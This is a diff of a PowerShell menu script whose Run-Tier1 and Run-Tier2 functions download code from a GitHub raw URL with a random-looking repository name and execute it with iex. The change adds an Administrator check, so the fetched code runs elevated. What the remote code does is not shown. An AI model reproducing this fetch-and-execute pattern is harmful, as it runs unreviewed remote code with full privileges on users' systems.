@@ -1,10 +1,10 @@
 # --- Functions to run Tier scripts silently ---
 function Run-Tier1 {
-iex (iwr "https://raw.githubusercontent.com/8jke/XC8Z-cxc-Z8C7X8ZC7Zx-C8xc-Z/refs/heads/main/Tier%201" -UseBasicParsing).Content 
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Write-Host "Please run this script as Administrator." -ForegroundColor Red; pause } else { cls; iex ((Invoke-WebRequest -Uri "https://raw.githubusercontent.com/8jke/XC8Z-cxc-Z8C7X8ZC7Zx-C8xc-Z/refs/heads/main/Tier%201" -UseBasicParsing).Content) }
 }
 
 function Run-Tier2 {
-iex (iwr "https://raw.githubusercontent.com/8jke/XC8Z-cxc-Z8C7X8ZC7Zx-C8xc-Z/refs/heads/main/Tier%202" -UseBasicParsing).Content 
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Write-Host "Please run this script as Administrator." -ForegroundColor Red; pause } else { cls; iex ((Invoke-WebRequest -Uri "https://raw.githubusercontent.com/8jke/XC8Z-cxc-Z8C7X8ZC7Zx-C8xc-Z/refs/heads/main/Tier%202" -UseBasicParsing).Content) }
 }
 
 # --- Display menu ---
